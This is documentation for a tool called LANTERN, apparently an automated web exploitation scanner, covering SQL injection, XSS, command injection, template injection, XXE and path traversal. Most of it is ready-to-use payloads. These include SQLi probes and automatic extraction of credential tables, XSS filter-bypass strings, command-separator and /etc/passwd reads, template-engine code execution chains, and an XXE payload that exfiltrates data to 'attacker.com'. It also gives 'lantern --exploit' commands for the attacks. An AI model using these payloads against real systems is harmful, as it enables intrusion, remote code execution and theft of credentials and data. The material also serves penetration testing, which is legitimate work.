[← Back to Index](../INDEX.md)

# Injection Testing

LANTERN doesn't just detect injections - it exploits them and extracts data automatically.

---

## SQL Injection

### What Makes It Different

LANTERN's SQLi module goes far beyond detection:

1. **Detection** - Error-based, boolean-based, time-based (supports MySQL, MSSQL, PostgreSQL, Oracle, SQLite)
2. **Database Fingerprinting** - Identifies exact database type from error messages
3. **Auto-Exploitation** - Once confirmed, automatically extracts:
   - Database version
   - Current database name
   - Table names (prioritizes `users`, `admin`, `credentials`, `passwords`)
   - Column names (looks for `password`, `token`, `api_key`, `credit_card`)
   - Actual data (usernames, hashed passwords, etc.)
4. **JSON Body Testing** - If no URL parameters exist, tests common JSON keys (`emailID`, `username`, `id`, `query`)
5. **MSSQL/Azure Support** - Uses `STRING_AGG` for blind extraction on modern SQL Server

### Detection Methods

**Error-Based Detection**
```bash
# Triggers database errors that reveal DB type
' OR '1'='1
' AND 1=CONVERT(int,(SELECT @@version))-- 
```

**Boolean-Based Detection**
```bash
# Compares responses to true/false conditions
' OR '1'='1'--    # TRUE condition
' AND '1'='2'--   # FALSE condition
# If responses differ consistently = injectable
```

**Time-Based Detection**
```bash
# Measures response time with delay payloads
' AND SLEEP(5)--           # MySQL
'; WAITFOR DELAY '00:00:05'--  # MSSQL
' AND pg_sleep(5)--        # PostgreSQL
```

### Exploitation

Once SQLi is confirmed, LANTERN automatically:

```
[SQLi] Vulnerability confirmed! Starting exploitation...
[SQLi] Enumerating columns for UNION...
[SQLi] Found 5 columns (marker confirmed)!
[SQLi] Version: 8.0.28-MySQL
[SQLi] Database: webapp_prod
[SQLi] Found table: users
[SQLi] Found table: admin_credentials
[SQLi] Extracting from users...
```

### Commands

```bash
# Basic SQLi scan
lantern -t https://target.com -m sqli

# SQLi with auto-exploitation
lantern -t https://target.com -m sqli --exploit

# SQLi with WAF bypass mutations
lantern -t https://target.com -m sqli --aggressive --exploit

# Maximum coverage
lantern -t https://target.com -m sqli --deep --aggressive --exploit
```

---

## Cross-Site Scripting (XSS)

### Context-Aware Testing

LANTERN detects WHERE your input is reflected and uses targeted payloads:

| Context | Example | Payloads Used |
|---------|---------|---------------|
| **HTML** | `<p>USER_INPUT</p>` | `<script>alert(1)</script>`, `<img onerror=...>` |
| **Attribute** | `<input value="USER_INPUT">` | `" onmouseover="alert(1)`, `" onfocus="alert(1)"` |
| **Script** | `var x = "USER_INPUT"` | `"-alert(1)-"`, `';alert(1)//` |
| **Style** | `<style>USER_INPUT</style>` | `</style><script>...` |
| **Comment** | `<!-- USER_INPUT -->` | `--><script>...<!--` |
| **Tag** | `<USER_INPUT>` | `><script>...`, `/><img onerror=...>` |

### Detection Process

1. **Inject marker** - Sends unique string like `ls8k2mX4`
2. **Find reflections** - Locates marker in response
3. **Detect context** - Determines if marker is in HTML, attribute, script, etc.
4. **Test context-specific payloads** - Uses payloads designed for that context
5. **Verify execution** - Confirms payload would execute

### WAF Bypass Payloads

LANTERN includes bypass techniques for common WAFs:

```javascript
// Case variations
<ScRiPt>alert(1)</sCrIpT>

// Tag variations
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

// Encoding
<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>

// eval bypass
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

// Constructor bypass
<img src=x onerror=[]['constructor']['constructor']('alert(1)')()>
```

### Commands

```bash
# Basic XSS scan
lantern -t https://target.com -m xss

# XSS with DOM testing
lantern -t https://target.com -m xss,dom --exploit

# XSS with callback server (for blind XSS)
lantern -t https://target.com -m xss --callback-host your-server.com

# Full client-side testing
lantern -t https://target.com -m xss,dom,prototype,csp --aggressive --exploit
```

---

## Command Injection

### Separator Techniques

LANTERN tests multiple command separators:

```bash
; id                  # Unix separator
| id                  # Pipe
& id                  # Background
&& id                 # AND
|| id                 # OR
`id`                  # Backticks
$(id)                 # Command substitution
%0aid                 # Newline
```

### Space Bypass

For filters blocking spaces:

```bash
cat${IFS}/etc/passwd          # $IFS = Internal Field Separator
cat$IFS$9/etc/passwd          # $9 = empty, but valid
cat%09/etc/passwd             # Tab
cat{,}/etc/passwd             # Brace expansion
```

### Commands

```bash
# Command injection scan
lantern -t https://target.com -m cmdi --exploit

# With OOB callback (for blind cmdi)
lantern -t https://target.com -m cmdi --oob-server --exploit

# RCE chain (cmdi + ssti + deserial + upload)
lantern -t https://target.com --chain rce --exploit
```

---

## Server-Side Template Injection (SSTI)

### Template Engine Detection

LANTERN identifies the template engine and escalates to RCE:

| Engine | Detection | Exploitation |
|--------|-----------|--------------|
| **Jinja2** | `{{7*7}}` → `49` | `{{config.items()}}`, `__class__.__mro__` chain |
| **Twig** | `{{7*7}}` → `49` | `_self.env.registerUndefinedFilterCallback` |
| **Freemarker** | `${7*7}` → `49` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| **Velocity** | `#set($x=7*7)$x` → `49` | `#set($rt=$x.class.forName("java.lang.Runtime"))` |
| **Smarty** | `{php}echo 1;{/php}` | `{system('id')}` |

### Commands

```bash
# SSTI scan
lantern -t https://target.com -m ssti --exploit

# SSTI with mutations
lantern -t https://target.com -m ssti --aggressive --deep --exploit

# Combined with deserialization
lantern -t https://target.com -m ssti,deserial --exploit
```

---

## XML External Entity (XXE)

### Attack Types

**Classic XXE (File Read)**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

**Blind XXE (OOB Exfiltration)**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
```

**XXE via File Upload**
```xml
<!-- In .svg, .docx, .xlsx files -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

### Commands

```bash
# XXE scan
lantern -t https://target.com -m xxe --exploit

# Blind XXE with OOB server
lantern -t https://target.com -m xxe --oob-server --exploit

# XXE + SSRF chain
lantern -t https://target.com -m xxe,ssrf --exploit
```

---

## LFI/Path Traversal

### Bypass Techniques

```
../../../etc/passwd           # Basic
....//....//....//etc/passwd  # Double encoding
..%2f..%2f..%2f/etc/passwd    # URL encoding
..%252f..%252f/etc/passwd     # Double URL encoding
..%c0%af..%c0%af/etc/passwd   # Overlong UTF-8
/etc/passwd%00.jpg            # Null byte (PHP < 5.3.4)
```

### Commands

```bash
# LFI scan
lantern -t https://target.com -m lfi --exploit

# LFI with file reading chain
lantern -t https://target.com -m lfi,xxe,download --exploit --deep
```

---

## Complete Injection Suite

```bash
# All injection types
lantern -t https://target.com -m sqli,xss,cmdi,ssti,lfi,xxe,crlf,hpp,ldap --exploit --aggressive

# Just the dangerous ones
lantern -t https://target.com -m sqli,cmdi,ssti,xxe --exploit --deep

# With WAF bypass
lantern -t https://target.com -m waf,sqli,xss,cmdi --aggressive --exploit
```

---

## What Gets Reported

For each injection found, LANTERN reports:

- **Confidence Level** - CONFIRMED (verified), HIGH, MEDIUM, LOW
- **Evidence** - Actual response showing the vulnerability
- **Request Data** - Full HTTP request that triggered it
- **Response Data** - Server response with highlighted payload
- **PoC Code** - Working curl command and Python script
- **Remediation** - Specific fix with code examples

---

[← Back to Index](../INDEX.md)
